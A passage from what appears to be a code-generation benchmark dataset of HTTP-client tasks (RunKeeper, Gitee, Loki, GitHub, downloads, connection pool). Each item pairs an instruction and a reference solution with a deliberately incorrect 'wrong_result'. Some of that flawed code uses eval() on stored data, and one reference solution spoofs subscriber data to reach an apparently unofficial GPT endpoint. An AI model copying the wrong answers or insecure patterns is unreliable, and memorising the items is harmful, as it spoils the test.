get_request(self, url, service_record):\n        response = self._rate_limit(\"get_request\",\n                                  lambda: requests.get(url,\n                                                      headers=self._api_headers(service_record)))\n        if response.status_code != 200:\n            if response.status_code in [401, 403]:\n                raise APIException(\"No authorization\", block=True, user_exception=UserException(UserExceptionType.Authorization, intervention_required=True))\n            raise APIException(\"Request failed: %s %s\" % (response.status_code, response.text))\n        return response.json()\n\n    def post_request(self, url, service_record, data=None):\n        response = self._rate_limit(\"post_request\",\n                                  lambda: requests.post(url,\n                                                       headers=self._api_headers(service_record),\n                                                       data=data))\n        response.raise_for_status()\n        return response\n\n    def delete_request(self, url, service_record):\n        response = self._rate_limit(\"delete_request\",\n                                  lambda: requests.delete(url,\n                                                         headers=self._api_headers(service_record)))\n        response.raise_for_status()\n        return response\n\n    def oauth_token_request(self, params):\n        response = self._rate_limit(\"auth_token\",\n                                  lambda: requests.post(\"https://runkeeper.com/apps/token\",\n                                                      data=urllib.parse.urlencode(params),\n                                                      headers={\"Content-Type\": \"application/x-www-form-urlencoded\"}))\n        if response.status_code != 200:\n            raise APIException(\"Invalid code\")\n        return response.json()[\"access_token\"]",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport time\nimport redis\nfrom typing import Callable, Optional, Dict\n\nclass RunKeeperAPI:\n    _RATE_LIMIT_KEY = \"runkeeper_rate_limit\"\n\n    def __init__(self, redis_host: str = 'localhost', redis_port: int = 6379):\n        self.redis_client = redis.Redis(host=redis_host, port=redis_port)\n\n    def _rate_limit(self, endpoint: str, req_lambda: Callable) -> requests.Response:\n        rate_key = f\"{self._RATE_LIMIT_KEY}:{endpoint}\"\n        limit = self.redis_client.get(rate_key)\n        if limit:\n            limit_data = eval(limit.decode('utf-8'))\n            if time.time() < limit_data['reset']:\n                wait_time = limit_data['reset'] - time.time()\n                time.sleep(wait_time)\n        response = req_lambda()\n        remaining = int(response.headers.get('X-RateLimit-Remaining', 0))\n        reset = int(response.headers.get('X-RateLimit-Reset', 0))\n        if remaining <= 10:\n            self.redis_client.setex(\n                rate_key,\n                reset - int(time.time()) + 60,\n                {'remaining': remaining, 'reset': reset}\n            )\n        return response\n\n    def _api_headers(self, service_record: object) -> dict:\n        return {\n            'Authorization': f'Bearer {service_record.token}',\n            'Content-Type': 'application/json'\n        }\n\n    def get_request(self, url: str, service_record: object) -> dict:\n        headers = self._api_headers(service_record)\n\n        def request_func():\n            return requests.get(url, headers=headers)\n\n        response = self._rate_limit(url, request_func)\n        response.raise_for_status()\n        return response.json()\n\n    def post_request(self, url: str, service_record: object, data: Optional[dict] = None) -> requests.Response:\n        headers = self._api_headers(service_record)\n\n        def request_func():\n            return requests.post(url, headers=headers, json=data)\n\n        return self._rate_limit(url, request_func)\n\n    def delete_request(self, url: str, service_record: object) -> requests.Response:\n        headers = self._api_headers(service_record)\n\n        def request_func():\n            return requests.delete(url, headers=headers)\n\n        return self._rate_limit(url, request_func)\n\n    def oauth_token_request(self, params: dict) -> str:\n        token_url = \"https://api.runkeeper.com/oauth2/token\"\n        response = requests.post(token_url, data=params)\n        response.raise_for_status()\n        return response.json()['access_token']\n```"
  },
  {
    "Task_id": 8,
    "Instruction": "Task Description: Create a Python class that manages JavaScript libraries and CSS files, loading their contents from remote URLs via HTTP/HTTPS and storing them for later use.\n\nClass Description: The `Javascript` class handles the loading and storage of JavaScript libraries and CSS files from remote sources. It provides functionality to initialize with URLs, normalize them into lists, and fetch their contents over HTTP/HTTPS connections.\n\nAttributes:\n- lib: [Sequence[str]] - List of URLs pointing to JavaScript libraries to be loaded\n- css: [Sequence[str]] - List of URLs pointing to CSS files to be loaded\n- data: [str] - Additional inline JavaScript code\n- javascript_contents: [dict[str, str]] - Dictionary mapping library URLs to their loaded content\n\nMethods:\n- __init__(data: Optional[str] = None, lib: Optional[Union[str, Sequence]] = None, css: Optional[Union[str, Sequence]] = None) -> None - Initializes the class instance, normalizing input parameters into lists\n- load_javascript_contents() -> Javascript - Loads the contents of all JavaScript libraries specified in lib attribute via HTTP/HTTPS, stores them in javascript_contents, and returns self for method chaining",
    "Canonical_solution": "from ..types import Optional, Sequence, Union\nfrom urllib.parse import urlparse\nimport http.client\n\nclass Javascript:\n    def __init__(\n        self,\n        data: Optional[str] = None,\n        lib: Optional[Union[str, Sequence]] = None,\n        css: Optional[Union[str, Sequence]] = None,\n    ):\n        if isinstance(lib, str):\n            lib = [lib]\n        elif lib is None:\n            lib = []\n        if isinstance(css, str):\n            css = [css]\n        elif css is None:\n            css = []\n        self.lib = lib\n        self.css = css\n        self.data = data or \"\"\n        self.javascript_contents = dict()\n\n    def load_javascript_contents(self):\n        for lib in self.lib:\n            parsed_url = urlparse(lib)\n            host: str = str(parsed_url.hostname)\n            port: int = parsed_url.port\n            path: str = parsed_url.path\n\n            resp: Optional[http.client.HTTPResponse] = None\n            try:\n                conn = http.client.HTTPSConnection(host, port)\n                conn.request(\"GET\", path)\n                resp = conn.getresponse()\n                if resp.status != 200:\n                    raise RuntimeError(\"Cannot load JavaScript lib: %s\" % lib)\n                self.javascript_contents[lib] = resp.read().decode(\"utf-8\")\n            finally:\n                if resp is not None:\n                    resp.close()\n        return self",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport requests\nfrom typing import Optional, Union, Sequence\n\nclass Javascript:\n    def __init__(\n        self,\n        data: Optional[str] = None,\n        lib: Optional[Union[str, Sequence]] = None,\n        css: Optional[Union[str, Sequence]] = None\n    ) -> None:\n        self.lib = [lib] if isinstance(lib, str) else list(lib) if lib else []\n        self.css = [css] if isinstance(css, str) else list(css) if css else []\n        self.data = data or \"\"\n        self.javascript_contents: dict[str, str] = {}\n\n    def load_javascript_contents(self) -> 'Javascript':\n        for url in self.lib:\n            try:\n                response = requests.get(url)\n                response.raise_for_status()\n                self.javascript_contents[url] = response.text\n            except Exception as e:\n                print(f\"Failed to load {url}: {e}\")\n        return self\n```"
  },
  {
    "Task_id": 80,
    "Instruction": "Task Description: Create a Python function to interact with Gitee's API to create a new release and upload a file to that release.\n\nFunction Description: This function performs two main operations: 1) Creates a new release in a specified Gitee repository using OAuth authentication, and 2) Uploads a specified file to the created release. The function handles authentication, API requests, and response processing.\n\nInput:\n- owner (str): The owner of the Gitee repository\n- repo (str): The name of the Gitee repository\n- tag (str): The tag name for the new release\n- file_path (str): Path to the file to be uploaded (default: \"Seraphine.7z\")\n\nOutput:\n- dict: A dictionary containing:\n  - release_id (str): The ID of the created release\n  - download_url (str): The download URL of the uploaded file\n\nNote: The function requires the following environment variables to be set:\n- GITEE_OWNER\n- GITEE_REPO\n- GITEE_USERNAME\n- GITEE_PASSWORD\n- GITEE_CLIENT_ID\n- GITEE_CLIENT_SECRET",
    "Canonical_solution": "import argparse\nimport os\nimport requests\n\nGITEE_OWNER = os.environ[\"GITEE_OWNER\"]\nGITEE_REPO = os.environ[\"GITEE_REPO\"]\nGITEE_USERNAME = os.environ[\"GITEE_USERNAME\"]\nGITEE_PASSWORD = os.environ[\"GITEE_PASSWORD\"]\nGITEE_CLIENT_ID = os.environ[\"GITEE_CLIENT_ID\"]\nGITEE_CLIENT_SECRET = os.environ[\"GITEE_CLIENT_SECRET\"]\n\ndef create_new_release(owner, repo):\n    ACCESS_TOKEN = requests.post(\n        \"https://gitee.com/oauth/token\",\n        data={\n            \"grant_type\": \"password\",\n            \"username\": GITEE_USERNAME,\n            \"password\": GITEE_PASSWORD,\n            \"client_id\": GITEE_CLIENT_ID,\n            \"client_secret\": GITEE_CLIENT_SECRET,\n            \"scope\": \"projects\",\n        },\n    ).json()[\"access_token\"]\n\n    HEADERS = {\"Authorization\": f\"Bearer {ACCESS_TOKEN}\"}\n    TAG_NAME = args.tag\n    NAME = TAG_NAME\n    BODY = f\"Seraphine {TAG_NAME}\"\n    TARGET_COMMITISH = \"master\"\n\n    url = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases\"\n    data = {\n        \"tag_name\": TAG_NAME,\n        \"name\": NAME,\n        \"body\": BODY,\n        \"target_commitish\": TARGET_COMMITISH,\n    }\n    response = requests.post(url, data=data, headers=HEADERS, timeout=30)\n    if 200 <= response.status_code < 300:\n        return response.json()[\"id\"]\n    else:\n        print(response.json())\n        raise requests.HTTPError(\"create release on gitee failed.\")\n\ndef upload_file(onwer, repo, release_id):\n    ACCESS_TOKEN = requests.post(\n        \"https://gitee.com/oauth/token\",\n        data={\n            \"grant_type\": \"password\",\n            \"username\": GITEE_USERNAME,\n            \"password\": GITEE_PASSWORD,\n            \"client_id\": GITEE_CLIENT_ID,\n            \"client_secret\": GITEE_CLIENT_SECRET,\n            \"scope\": \"projects\",\n        },\n    ).json()[\"access_token\"]\n\n    HEADERS = {\"Authorization\": f\"Bearer {ACCESS_TOKEN}\"}\n    FILE_PATH = \"Seraphine.7z\"\n\n    url = f\"https://gitee.com/api/v5/repos/{onwer}/{repo}/releases/{release_id}/attach_files\"\n    files = {\"file\": open(FILE_PATH, \"rb\")}\n    response = requests.post(url, files=files, headers=HEADERS, timeout=30)\n\n    if 200 <= response.status_code < 300:\n        return response.json()[\"browser_download_url\"]\n    else:\n        print(response.json())\n        raise requests.HTTPError(\"push release file to Gitee failed.\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\n\ndef create_gitee_release_and_upload(owner, repo, tag, file_path=\"Seraphine.7z\"):\n    GITEE_TOKEN_URL = \"https://gitee.com/oauth/token\"\n    GITEE_API_RELEASES_URL = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases\"\n    GITEE_API_UPLOAD_URL = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases/upload_asset\"\n\n    client_id = os.getenv(\"GITEE_CLIENT_ID\")\n    client_secret = os.getenv(\"GITEE_CLIENT_SECRET\")\n    username = os.getenv(\"GITEE_USERNAME\")\n    password = os.getenv(\"GITEE_PASSWORD\")\n\n    data = {\n        \"grant_type\": \"password\",\n        \"username\": username,\n        \"password\": password,\n        \"client_id\": client_id,\n        \"client_secret\": client_secret,\n    }\n\n    response = requests.post(GITEE_TOKEN_URL, data=data)\n    access_token = response.json().get(\"access_token\")\n\n    headers = {\"Authorization\": f\"token {access_token}\"}\n    release_data = {\"tag_name\": tag, \"name\": tag, \"target_commitish\": \"main\", \"body\": \"Release\", \"draft\": False, \"prerelease\": False}\n\n    response = requests.post(GITEE_API_RELEASES_URL, headers=headers, json=release_data)\n    release_info = response.json()\n    release_id = release_info.get(\"id\")\n\n    upload_url = f\"{GITEE_API_UPLOAD_URL}?release_id={release_id}\"\n    with open(file_path, \"rb\") as file:\n        files = {\"file\": file}\n        data = {\"name\": os.path.basename(file_path)}\n        response = requests.post(upload_url, headers=headers, data=data, files=files)\n\n    asset_info = response.json()\n    download_url = asset_info.get(\"browser_download_url\")\n\n    return {\"release_id\": str(release_id), \"download_url\": download_url}\n```"
  },
  {
    "Task_id": 81,
    "Instruction": "Task Description: Create a Python class that interacts with a Loki logging system through HTTP and WebSocket connections, allowing for querying log ranges and tailing live logs.\n\nClass Description: The LokiClient class provides methods to query historical log data (query_range) and establish a WebSocket connection for live log tailing (create_tail_ws). The LokiTailWs class manages the WebSocket connection for live log streaming.\n\nAttributes:\n- query_range_url: str - Endpoint path for querying log ranges\n- tail_url: str - Endpoint path for tailing live logs\n- base_url: str - Base URL of the Loki server\n\nMethods:\n- __init__(base_url: str) -> None - Initializes the client with the Loki server's base URL\n- query_range(query: str, start: str, end: str, limit: int = 100) -> dict - Queries log data within a specified time range\n- create_tail_ws(query: str, limit: int = 100) -> LokiTailWs - Creates a WebSocket connection for live log tailing\n\nLokiTailWs Class Description: Manages a WebSocket connection for streaming live logs from Loki.\n\nAttributes:\n- _ws: WebSocket - The active WebSocket connection\n\nMethods:\n- __init__(ws: WebSocket) -> None - Initializes with an established WebSocket connection\n- messages() -> Generator - Yields incoming log messages from the WebSocket\n- close() -> None - Closes the WebSocket connection",
    "Canonical_solution": "import urllib.parse\nimport requests\nfrom websockets.sync.client import connect as ws_connect\n\nclass LokiClient:\n    query_range_url = '/loki/api/v1/query_range'\n    tail_url = '/loki/api/v1/tail'\n\n    def __init__(self, base_url: str):\n        self.base_url = base_url.rstrip('/')\n\n    def query_range(self, query, start, end, limit=100):\n        params = {\n            'query': query,\n            'start': start,\n            'end': end,\n            'limit': limit,\n        }\n        url = f\"{self.base_url}{self.query_range_url}\"\n        response = requests.get(url, params=params)\n        if response.status_code != 200:\n            raise Exception(response.text)\n        return response.json()\n\n    def create_tail_ws(self, query, limit=100):\n        data = {'query': query, 'limit': limit}\n        params = urllib.parse.urlencode(data)\n        ws_url = f\"ws://{self.base_url[7:]}\"\n        if self.base_url.startswith('https://'):\n            ws_url = f\"wss://{self.base_url[8:]}\"\n        url = f\"{ws_url}{self.tail_url}?{params}\"\n        ws = ws_connect(url)\n        return LokiTailWs(ws)\n\nclass LokiTailWs:\n    def __init__(self, ws):\n        self._ws = ws\n\n    def messages(self):\n        for message in self._ws:\n            yield message\n\n    def close(self):\n        if self._ws:\n            self._ws.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport websockets\nimport json\nfrom typing import Generator, Dict, Any\n\nclass LokiClient:\n    def __init__(self, base_url: str) -> None:\n        self.base_url = base_url.rstrip('/')\n        self.query_range_url = f\"{self.base_url}/loki/api/v1/query_range\"\n        self.tail_url = f\"{self.base_url}/loki/api/v1/tail\"\n\n    def query_range(self, query: str, start: str, end: str, limit: int = 100) -> dict:\n        params = {\n            \"query\": query,\n            \"start\": start,\n            \"end\": end,\n            \"limit\": limit\n        }\n        response = requests.post(self.query_range_url, params=params)\n        return response.json()\n\n    def create_tail_ws(self, query: str, limit: int = 100) -> 'LokiTailWs':\n        ws_url = f\"wss://{self.base_url.lstrip('http://').lstrip('https://')}/loki/api/v1/tail\"\n        headers = {\n            \"X-Scope-OrgID\": \"default-tenant\"  # Adjust if necessary for your Loki setup\n        }\n        params = {\n            \"query\": query,\n            \"limit\": limit\n        }\n        ws = websockets.connect(ws_url, extra_headers=headers, params=params)\n        return LokiTailWs(ws)\n\n\nclass LokiTailWs:\n    def __init__(self, ws: websockets.WebSocketClientProtocol) -> None:\n        self._ws = ws\n\n    async def messages(self) -> Generator[Dict[str, Any], None, None]:\n        async for message in self._ws:\n            yield json.loads(message)\n\n    def close(self) -> None:\n        self._ws.close()\n```"
  },
  {
    "Task_id": 82,
    "Instruction": "Task Description: Implement a set of functions to interact with the GitHub API for retrieving release, comparison, pull request, and search information.\n\nFunction Description: The functions provide HTTP client functionality to query GitHub's REST API for specific repository information using authentication tokens.\n\nInput:\n- token: str - GitHub personal access token for authentication\n- repo: str - Repository name in format 'owner/repo'\n- base: str - Base commit/tag for comparison (only for get_github_compare)\n- head: str - Head commit/tag for comparison (only for get_github_compare)\n- pr_number: int - Pull request number (only for get_github_pull_request)\n- sha: str - Commit SHA hash (only for search_github_prs)\n\nOutput:\n- get_github_release: str - Returns the latest release tag name\n- get_github_compare: dict - Returns comparison data between two commits/tags\n- get_github_pull_request: dict - Returns pull request details\n- search_github_prs: dict - Returns search results for merged PRs containing the commit SHA",
    "Canonical_solution": "import requests\n\ndef get_github_release(token, repo):\n    response = requests.get(f\"https://api.github.com/repos/{repo}/releases/latest\", \n                          headers={'Authorization': f'token {token}'})\n    while response.status_code == 401:\n        print(\"Error: Invalid GitHub API token.\")\n        token = input('Token: ').strip()\n        response = requests.get(f\"https://api.github.com/repos/{repo}/releases/latest\", \n                              headers={'Authorization': f'token {token}'})\n    release = response.json()\n    return release[\"tag_name\"]\n\ndef get_github_compare(token, repo, base, head):\n    commits = requests.get(f\"https://api.github.com/repos/{repo}/compare/{base}...{head}\", \n                          headers={'Authorization': f'token {token}'}).json()\n    return commits\n\ndef get_github_pull_request(token, repo, pr_number):\n    pr_details = requests.get(f\"https://api.github.com/repos/{repo}/pulls/{pr_number}\", \n                            headers={'Authorization': f'token {token}'}).json()\n    return pr_details\n\ndef search_github_prs(token, repo, sha):\n    prs = requests.get(f\"https://api.github.com/search/issues?q=repo:{repo}+type:pr+is:merged+{sha}\", \n                      headers={'Authorization': f'token {token}'}).json()\n    return prs",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\n\ndef get_github_release(token, repo):\n    url = f\"https://api.github.com/repos/{repo}/releases/latest\"\n    headers = {\"Authorization\": f\"token {token}\"}\n    response = requests.get(url, headers=headers)\n    return response.json()[\"tag_name\"]\n\ndef get_github_compare(token, repo, base, head):\n    url = f\"https://api.github.com/repos/{repo}/compare/{base}...{head}\"\n    headers = {\"Authorization\": f\"token {token}\"}\n    response = requests.get(url, headers=headers)\n    return response.json()\n\ndef get_github_pull_request(token, repo, pr_number):\n    url = f\"https://api.github.com/repos/{repo}/pulls/{pr_number}\"\n    headers = {\"Authorization\": f\"token {token}\"}\n    response = requests.get(url, headers=headers)\n    return response.json()\n\ndef search_github_prs(token, repo, sha):\n    url = f\"https://api.github.com/repos/{repo}/search/issues\"\n    params = {\n        \"q\": f\"sha:{sha}+is:pr+is:merged\",\n        \"sort\": \"created\",\n        \"order\": \"desc\"\n    }\n    headers = {\"Authorization\": f\"token {token}\"}\n    response = requests.get(url, headers=headers, params=params)\n    return response.json()\n```"
  },
  {
    "Task_id": 87,
    "Instruction": "Task Description: Implement a Python function to download a file from a given URL and cache it locally, with progress tracking and ETag-based caching.\n\nFunction Description: The function should download a file from a specified URL to a local cache directory, using ETag headers for cache validation. It should show download progress and handle temporary files during download. If the file already exists in cache (verified by ETag), it should skip downloading.\n\nInput:\n- url: str - The URL of the file to download\n- cache_dir: Optional[str] - (Optional) Directory path for caching downloaded files. Defaults to DATASET_CACHE if None.\n\nOutput:\n- str - Returns the local file path where the downloaded content is cached\n\nNote: The function should:\n1. Create cache directory if it doesn't exist\n2. Check file existence using HEAD request and ETag\n3. Download with progress bar if not in cache\n4. Store metadata (URL and ETag) alongside cached file\n5. Handle temporary files safely during download\n6. Return final cache path",
    "Canonical_solution": "import os\nimport requests\nimport tempfile\nimport shutil\nimport json\nfrom tqdm import tqdm\n\nCACHE_ROOT = Path(os.getenv(\"SCISPACY_CACHE\", str(Path.home() / \".scispacy\")))\nDATASET_CACHE = str(CACHE_ROOT / \"datasets\")\n\ndef http_get(url: str, temp_file: IO) -> None:\n    req = requests.get(url, stream=True)\n    total = int(req.headers.get(\"content-length\", 0))\n    pbar = tqdm(total=total, unit=\"iB\", unit_scale=True, unit_divisor=1024)\n    for chunk in req.iter_content(chunk_size=1024):\n        if chunk:  # filter out keep-alive new chunks\n            size = temp_file.write(chunk)\n            pbar.update(size)\n    pbar.close()\n\ndef get_from_cache(url: str, cache_dir: Optional[str] = None) -> str:\n    if cache_dir is None:\n        cache_dir = DATASET_CACHE\n\n    os.makedirs(cache_dir, exist_ok=True)\n\n    response = requests.head(url, allow_redirects=True)\n    if response.status_code != 200:\n        raise IOError(\n            \"HEAD request failed for url {} with status code {}\".format(\n                url, response.status_code\n            )\n        )\n    etag = response.headers.get(\"ETag\")\n\n    filename = url_to_filename(url, etag)\n\n    cache_path = os.path.join(cache_dir, filename)\n\n    if not os.path.exists(cache_path):\n        with tempfile.NamedTemporaryFile() as temp_file:\n            print(f\"{url} not found in cache, downloading to {temp_file.name}\")\n\n            http_get(url, temp_file)\n\n            temp_file.flush()\n            temp_file.seek(0)\n\n            print(f\"Finished download, copying {temp_file.name} to cache at {cache_path}\")\n            with open(cache_path, \"wb\") as cache_file:\n                shutil.copyfileobj(temp_file, cache_file)\n\n            meta = {\"url\": url, \"etag\": etag}\n            meta_path = cache_path + \".json\"\n            with open(meta_path, \"w\") as meta_file:\n                json.dump(meta, meta_file)\n\n    return cache_path",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\nfrom pathlib import Path\nfrom typing import Optional\nimport hashlib\nimport json\n\nDATASET_CACHE = os.path.expanduser(\"~/.cache/dataset\")\n\ndef download_file(url: str, cache_dir: Optional[str] = None) -> str:\n    if cache_dir is None:\n        cache_dir = DATASET_CACHE\n    Path(cache_dir).mkdir(parents=True, exist_ok=True)\n\n    filename = url.split('/')[-1]\n    file_path = Path(cache_dir) / filename\n    meta_path = file_path.with_suffix(file_path.suffix + \".meta\") if file_path.suffix else file_path.with_name(file_path.name + \".meta\")\n    \n    if meta_path.exists():\n        with open(meta_path, 'r') as f:\n            meta = json.load(f)\n        if meta.get(\"url\") == url and \"etag\" in meta:\n            headers = {\"If-None-Match\": meta[\"etag\"]}\n        else:\n            headers = {}\n    else:\n        headers = {}\n\n    response = requests.head(url, allow_redirects=True, headers=headers)\n    if response.status_code == 304:\n        return str(file_path)\n\n    if response.headers.get('Content-Disposition'):\n        filename = response.headers['Content-Disposition'].split('filename=')[1].strip('\"\\'')\n        file_path = Path(cache_dir) / filename\n        meta_path = file_path.with_suffix(file_path.suffix + \".meta\") if file_path.suffix else file_path.with_name(file_path.name + \".meta\")\n\n    temp_file_path = file_path.with_suffix(file_path.suffix + \".tmp\") if file_path.suffix else file_path.with_name(file_path.name + \".tmp\")\n\n    response = requests.get(url, stream=True, headers=headers)\n    total_size = int(response.headers.get('content-length', 0))\n    block_size = 1024 * 1024  # 1 MB\n    progress = 0\n\n    with open(temp_file_path, 'wb') as f:\n        for data in response.iter_content(block_size):\n            f.write(data)\n            progress += len(data)\n            if total_size > 0:\n                percent = (progress / total_size) * 100\n                print(f\"\\rDownloaded {progress}/{total_size} bytes ({percent:.2f}%)\", end='')\n\n    print(\"\\nDownload completed.\")\n\n    etag = response.headers.get('ETag', '')\n    if etag.startswith('\"') and etag.endswith('\"'):\n        etag = etag[1:-1]\n\n    if file_path.exists():\n        file_path.unlink()\n    temp_file_path.rename(file_path)\n\n    meta = {\n        \"url\": url,\n        \"etag\": etag\n    }\n    with open(meta_path, 'w') as f:\n        json.dump(meta, f)\n\n    return str(file_path)\n```"
  },
  {
    "Task_id": 89,
    "Instruction": "Task Description: Create a Python function that interacts with a GPT API endpoint to generate completions based on given messages, handling the HTTP request and response process.\n\nFunction Description: The function `_create_completion` sends a POST request to a specified GPT API endpoint with formatted messages and randomly generated user data. It processes the response to extract and yield the assistant's message content if the request is successful.\n\nInput:\n- model: str - The GPT model to use (e.g., 'gpt-3.5-turbo')\n- messages: list - A list of message dictionaries, each containing 'role' and 'content' keys\n- stream: bool - A flag indicating whether to stream the response (not used in this implementation)\n- **kwargs: Additional optional arguments\n\nOutput:\n- Generator[str, None, None] - Yields the assistant's message content if the request is successful\n- None - Returns None if an error occurs during the request",
    "Canonical_solution": "import os\nimport requests\nimport json\nimport random\nimport time\nimport string\nfrom ...typing import sha256, Dict, get_type_hints\n\nurl = \"https://wewordle.org/gptapi/v1/android/turbo\"\nmodel = ['gpt-3.5-turbo']\nsupports_stream = False\nneeds_auth = False\n\ndef _create_completion(model: str, messages: list, stream: bool, **kwargs):\n    base = ''\n    for message in messages:\n        base += '%s: %s\\n' % (message['role'], message['content'])\n    base += 'assistant:'\n    _user_id = ''.join(random.choices(\n        f'{string.ascii_lowercase}{string.digits}', k=16))\n    _app_id = ''.join(random.choices(\n        f'{string.ascii_lowercase}{string.digits}', k=31))\n    _request_date = time.strftime(\"%Y-%m-%dT%H:%M:%S.000Z\", time.gmtime())\n    headers = {\n        'accept': '*/*',\n        'pragma': 'no-cache',\n        'Content-Type': 'application/json',\n        'Connection': 'keep-alive'\n    }\n    data = {\n        \"user\": _user_id,\n        \"messages\": [\n            {\"role\": \"user\", \"content\": base}\n        ],\n        \"subscriber\": {\n            \"originalPurchaseDate\": None,\n            \"originalApplicationVersion\": None,\n            \"allPurchaseDatesMillis\": {},\n            \"entitlements\": {\n                \"active\": {},\n                \"all\": {}\n            },\n            \"allPurchaseDates\": {},\n            \"allExpirationDatesMillis\": {},\n            \"allExpirationDates\": {},\n            \"originalAppUserId\": f\"$RCAnonymousID:{_app_id}\",\n            \"latestExpirationDate\": None,\n            \"requestDate\": _request_date,\n            \"latestExpirationDateMillis\": None,\n            \"nonSubscriptionTransactions\": [],\n            \"originalPurchaseDateMillis\": None,\n            \"managementURL\": None,\n            \"allPurchasedProductIdentifiers\": [],\n            \"firstSeen\": _request_date,\n            \"activeSubscriptions\": []\n        }\n    }\n    response = requests.post(url, headers=headers, data=json.dumps(data))\n    if response.status_code == 200:\n        _json = response.json()\n        if 'message' in _json:\n            message_content = _json['message']['content']\n            message_content = message_content.replace('**assistant:** ', '')\n            yield message_content\n    else:\n        print(f\"Error Occurred::{response.status_code}\")\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport random\nimport string\nfrom typing import Generator\n\ndef _create_completion(model: str, messages: list, stream: bool = False, **kwargs) -> Generator[str, None, None]:\n    url = \"https://api.example.com/v1/chat/completions\"\n    headers = {\n        \"Authorization\": f\"Bearer {kwargs.get('api_key', 'your_api_key')}\",\n        \"Content-Type\": \"application/json\"\n    }\n    user_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))\n    \n    payload = {\n        \"model\": model,\n        \"messages\": messages,\n        \"stream\": stream,\n        \"user\": user_id\n    }\n\n    try:\n        response = requests.post(url, json=payload, headers=headers)\n        response.raise_for_status()\n        data = response.json()\n        if 'choices' in data and len(data['choices']) > 0:\n            content = data['choices'][0]['message']['content']\n            yield content\n    except requests.RequestException as e:\n        print(f\"Request error: {e}\")\n    except Exception as e:\n        print(f\"Error processing response: {e}\")\n```"
  },
  {
    "Task_id": 9,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages reusable HTTP connections to a server, handling connection creation, retrieval, and release, with support for retries and timeouts.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP connections that maintains a pool of reusable connections to a specified host and port. It handles connection lifecycle, retries on failures, and timeout management.\n\nAttributes:\n- scheme: [str] - The URL scheme (default 'http')\n- ConnectionCls: [class] - The connection class to use (default HTTPConnection)\n- host: [str] - The target host for connections\n- port: [int] - The target port for connections\n- timeout: [Timeout] - Default timeout configuration\n- retries: [Retry] - Retry configuration for failed requests\n- pool: [LifoQueue] - Queue holding the connection pool\n- block: [bool] - Whether to block when pool is empty\n- proxy: [dict] - Proxy configuration\n- proxy_headers: [dict] - Headers for proxy requests\n- conn_kw: [dict] - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with given configuration\n- _new_conn() -> HTTPConnection - Creates a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the given connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, timeout=_Default, **response_kw) -> HTTPResponse - Main method to execute HTTP requests with retry and timeout handling\n- close() -> None - Closes all connections in the pool",
    "Canonical_solution": "from socket import error as SocketError, timeout as SocketTimeout\nimport socket\nfrom .connection import HTTPConnection, HTTPSConnection, VerifiedHTTPSConnection\nfrom .exceptions import (\n    MaxRetryError,\n    ProtocolError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n    HTTPException,\n    BaseSSLError,\n    NewConnectionError,\n    ProxyError\n)\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.queue import LifoQueue\nimport queue\nimport sys\nimport warnings\n\nclass HTTPConnectionPool:\n    scheme = 'http'\n    ConnectionCls = HTTPConnection\n\n    def __init__(self, host, port=None, strict=False,\n                 timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False,\n                 headers=None, retries=None,\n                 _proxy=None, _proxy_headers=None,\n                 **conn_kw):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n            if conn and is_connection_dropped(conn):\n                conn.close()\n                conn = None\n            return conn or self._new_conn()\n        except queue.Empty:\n            raise EmptyPoolError(self, \"Pool is empty.\")\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            conn.request(method, url, **httplib_request_kw)\n            httplib_response = conn.getresponse()\n            return httplib_response\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=conn.timeout)\n            raise\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None,\n                redirect=True, timeout=_Default, **response_kw):\n        if retries is None:\n            retries = self.retries\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=timeout_obj.connect_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers\n            )\n\n            response = self.ResponseCls.from_httplib(\n                